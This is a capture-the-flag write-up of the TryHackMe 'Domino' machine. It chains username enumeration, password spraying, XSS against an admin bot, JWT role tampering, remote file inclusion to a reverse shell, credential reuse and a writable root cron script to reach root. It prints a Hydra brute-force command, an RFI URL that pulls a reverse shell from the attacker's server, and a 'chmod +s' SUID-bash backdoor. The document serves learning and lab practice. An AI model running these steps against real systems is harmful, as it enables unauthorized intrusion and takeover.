```markdown
# Domino - TryHackMe CTF

## Overview

This was a multi-stage attack where I had to chain several vulnerabilities together to fully compromise the machine.

The attack started with weak authentication and eventually led to a root shell through:

- Username enumeration
- Password spraying
- XSS
- Admin session hijacking
- JWT manipulation
- Directory enumeration
- Remote File Inclusion (RFI)
- Remote Code Execution (RCE)
- Credential reuse
- Lateral movement
- Cron-based privilege escalation
- SUID abuse

The main lesson I took from this machine is that vulnerabilities do not always need to be critical individually. When several weaknesses can be chained together, they can lead to complete system compromise.

---

## 1. Reconnaissance & Initial Access

I started by enumerating the web application and looking for information that could help me identify valid users.

The `Team` section exposed usernames that appeared to be valid accounts.

Once I had a list of usernames, I tested whether weak passwords were being used.

I used Hydra to perform a password spraying/brute-force attack:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt 10.113.154.177 http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials.' -I
```

This successfully identified valid credentials and gave me initial access to the application.

### What I Observed

The application was leaking valid usernames through a publicly accessible section. This gave me useful information before attempting authentication attacks.

### What I Learned

User enumeration can make password attacks much more effective.

Instead of attacking unknown usernames and passwords blindly, I first reduced the attack surface by identifying valid accounts.

Weak password hygiene can therefore become the first step in a much larger attack chain.

---

## 2. XSS & Admin Session Hijacking

After gaining access to the application, I investigated its functionality and found a support feature involving `support tokens`.

The submitted tokens were processed by an admin bot that automatically viewed the reports.

This immediately made the functionality interesting from an XSS perspective because anything executed by the admin bot could potentially run in the admin's browser context.

I tested whether I could inject JavaScript through the support functionality.

The XSS was successfully triggered when the admin bot processed the malicious input.

This allowed me to interact with the admin's browser session and obtain unauthorized administrative access.

### What I Observed

The important detail was that my input was not simply stored somewhere in the application. It was later processed by an automated admin bot.

This changed the impact of the XSS because the JavaScript was executed in a privileged user's browser context.

### What I Learned

An XSS vulnerability becomes much more interesting when the vulnerable input is viewed by a privileged user or automated admin bot.

The important part was not just finding XSS, but understanding **who processes the payload** and what privileges that browser session has.

---

## 3. JWT Manipulation & Authorization Bypass

After obtaining administrative access, I continued enumerating the application's API.

I found an endpoint that used JSON Web Tokens (JWT) for authentication and authorization.

I inspected the JWT structure and noticed that the token contained information such as the username and role.

I tested whether I could modify the token and change the privileges.

The modified payload was:

```json
{
  "sub": "laura.hayes",
  "role": "admin"
}
```

I then used the token in the request header:

```http
Authorization: Bearer <JWT>
```

The application accepted the modified token because of a weakness in how JWT authentication and authorization were implemented.

This allowed me to access functionality that should have been restricted.

### What I Observed

The application appeared to trust authorization information contained in the JWT without properly preventing the privilege modification.

The `role` claim was particularly important because changing it to `admin` resulted in elevated access.

### What I Learned

JWTs are only secure when the server correctly validates the token signature and properly enforces the authorization claims.

During a pentest, I should always test whether:

- The algorithm is correctly enforced
- The signature is actually verified
- Claims such as `role` are trusted by the backend
- Privilege changes are possible by modifying the payload

---

## 4. Directory Enumeration & Sensitive File Discovery

I continued with directory and endpoint enumeration to identify additional application functionality and files.

This revealed configuration and database-related resources that should not have been publicly accessible.

Some of the discovered files contained sensitive information and internal secrets.

I initially considered whether these secrets could be useful for JWT signing.

However, further testing showed that authentication validation could already be bypassed, so the JWT secret was not necessary for the attack.

### What I Observed

The application exposed files that contained information which should normally remain server-side.

Even though the discovered secret was not ultimately required for the attack, it helped me understand more about the application's configuration and attack surface.

### What I Learned

Directory enumeration is not only about finding login panels or hidden pages.

Configuration files, backups, database files and other internal resources can expose:

- Credentials
- API keys
- Application secrets
- Database information
- Internal configuration
- Authentication-related data

Even when one discovered secret turns out not to be useful, the information can still help me understand the application's architecture.

---

## 5. Remote File Inclusion → Remote Code Execution

One of the most important findings was in:

```text
files.php
```

I identified functionality that accepted a filename or URL and fetched remote content.

The vulnerable code contained:

```php
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);

    if ($remote === false) {
        http_response_code(502);
        echo json_encode(["error" => "Could not fetch remote file"]);
        exit;
    }

    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();

    echo json_encode(["output" => $output]);
    exit;
}
```

The important part was the combination of:

```php
file_get_contents()
```

and:

```php
eval()
```

The application was not simply downloading a remote file. It was taking the downloaded content and executing it as PHP code.

This created a Remote File Inclusion (RFI) vulnerability that could be escalated to Remote Code Execution.

### Exploitation

I hosted a malicious PHP payload on my machine using Python's HTTP server:

```bash
python3 -m http.server 8000
```

I then referenced the hosted payload through the vulnerable parameter:

```text
http://10.113.154.177/api/files.php?name=http://10.113.109.167:8000/shell.txt
```

The `shell.txt` file contained the Pentest Monkey PHP reverse shell payload.

The target fetched the file and executed the PHP code through the vulnerable `eval()` call.

This resulted in a reverse shell as:

```text
www-data
```

### What I Observed

The application trusted a remote URL supplied by the user and then executed the retrieved content.

The `eval()` call was the critical part that transformed the file-fetching functionality into arbitrary code execution.

### What I Learned

The dangerous part here was not simply allowing remote URLs.

The critical issue was that the downloaded content was passed directly into `eval()`.

This turned what could have been a file-fetching feature into arbitrary code execution.

The important lesson for me was to understand **what happens to user-controlled input after it reaches the server**, rather than stopping at the initial file inclusion finding.

---

## 6. Horizontal Privilege Escalation

Once I had a shell as `www-data`, I started enumerating the system and application files.

While inspecting the application's configuration, I found a hardcoded database password:

```text
DB_PASS = D3v0ps!2024
```

I tested whether this password was reused elsewhere.

The password worked for the `devops` user account.

I switched users with:

```bash
su devops
```

This gave me access to the system as:

```text
devops
```

### What I Observed

A database credential was stored directly inside the application's configuration and was also valid for a local user account.

This allowed me to move from the low-privileged `www-data` account to `devops`.

### What I Learned

This was a good example of why credentials found inside application configuration files should always be tested for reuse.

A credential intended for a database may also have been reused for:

- Linux users
- SSH
- Other services
- Administrative accounts

Credential reuse can turn a low-privileged web shell into a much more useful system account.

---

## 7. Privilege Escalation to Root

With access as `devops`, I started looking for privilege escalation opportunities.

During system enumeration, I discovered a monitoring script:

```text
/opt/monitoring/health_report.sh
```

The important part was that the script was executed in a privileged context but was writable by the `devops` group.

This meant I could influence code that would later be executed with higher privileges.

I modified the script and added:

```bash
chmod +s /usr/bin/bash
```

The purpose of this was to set the SUID bit on Bash when the script was executed.

After the scheduled job ran, I checked the permissions of Bash and confirmed that the SUID bit had been set.

I could then obtain a privileged shell with:

```bash
bash -p
```

This resulted in root access.

### What I Observed

The key finding was not simply the existence of a cron job.

The important combination was:

1. The script was executed with root privileges.
2. The script was writable by the `devops` group.
3. I had access to the `devops` account.
4. Therefore, I could modify code that would later execute as root.

### What I Learned

This was a classic example of a dangerous cron configuration.

The important chain was:

```text
Writable script
      ↓
Executed by root
      ↓
Modify script
      ↓
Wait for scheduled execution
      ↓
SUID Bash
      ↓
bash -p
      ↓
root
```

When performing Linux privilege escalation, I should always investigate:

- Cron jobs
- Writable scripts
- SUID binaries
- File permissions
- Scheduled tasks
- Processes running as root
- Group memberships

A script does not need to be directly executable by me as root. If it is **writable by me and executed by root**, it can still become a privilege escalation path.

---

## 8. Complete Attack Chain

The complete attack path was:

```text
Username Enumeration
        ↓
Weak Credentials
        ↓
Password Spraying
        ↓
Initial Web Access
        ↓
XSS
        ↓
Admin Bot / Session Hijacking
        ↓
JWT Manipulation
        ↓
Authorization Bypass
        ↓
Directory Enumeration
        ↓
Sensitive File Discovery
        ↓
RFI
        ↓
RCE
        ↓
www-data
        ↓
Hardcoded Credential
        ↓
Credential Reuse
        ↓
devops
        ↓
Writable Root-Executed Cron Script
        ↓
SUID Bash
        ↓
bash -p
        ↓
ROOT
```

---

## 9. Key Findings

The main weaknesses I identified were:

| Vulnerability | Impact |
|---|---|
| Username Enumeration | Helped identify valid accounts |
| Weak Authentication | Allowed initial access |
| XSS | Allowed execution in the admin bot's context |
| Broken JWT Authorization | Allowed privilege escalation |
| Sensitive File Exposure | Revealed internal application information |
| Remote File Inclusion | Allowed attacker-controlled remote content |
| Unsafe `eval()` | Turned RFI into RCE |
| Hardcoded Credentials | Exposed reusable credentials |
| Credential Reuse | Allowed lateral movement to `devops` |
| Writable Root-Executed Script | Enabled privilege escalation |
| SUID Bash | Provided a path to root |

---

## 10. Final Takeaways

The biggest lesson from Domino was the importance of **chaining vulnerabilities**.

The individual vulnerabilities were not necessarily enough to completely compromise the machine on their own.

The attack became successful because each finding provided the access or information required for the next stage:

```text
Information
    ↓
Credentials
    ↓
Access
    ↓
Privilege
    ↓
Code Execution
    ↓
Lateral Movement
    ↓
Root
```

From a pentesting perspective, I should not treat each vulnerability as an isolated finding.

After every successful exploitation step, I should ask:

> **What does this access give me, and what can I reach from here?**

This mindset was the most valuable lesson I took from this machine.
```